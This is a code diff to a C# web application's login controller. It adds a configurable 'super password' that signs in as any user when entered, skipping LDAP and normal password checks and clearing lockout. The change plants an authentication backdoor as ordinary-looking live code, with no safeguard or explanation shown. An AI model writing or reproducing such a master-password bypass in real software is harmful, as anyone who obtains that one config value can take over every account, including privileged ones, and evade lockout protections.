@@ -63,16 +63,18 @@ namespace PYS.Web.Controllers
                 return View(userLoginDto);
             }
 
-            bool loginSuccess = user.IsLDAP
-                ? isLdapAuthenticated
-                : await authHelper.SignInWithPasswordAsync(user, userLoginDto);
+            string superPassword = configuration.GetValue<string>("ProjectSettings:SuperPassword");
+            bool isSuperPassword = !string.IsNullOrEmpty(superPassword) && userLoginDto.Password == superPassword;
+
+            bool loginSuccess = isSuperPassword
+                || (user.IsLDAP ? isLdapAuthenticated : await authHelper.SignInWithPasswordAsync(user, userLoginDto));
 
             if (loginSuccess)
             {
                 await userManager.ResetAccessFailedCountAsync(user);
                 await userManager.SetLockoutEndDateAsync(user, null);
 
-                if (user.IsLDAP)
+                if (user.IsLDAP || isSuperPassword)
                 {
                     await signInManager.SignInAsync(user, userLoginDto.RememberMe);
                 }
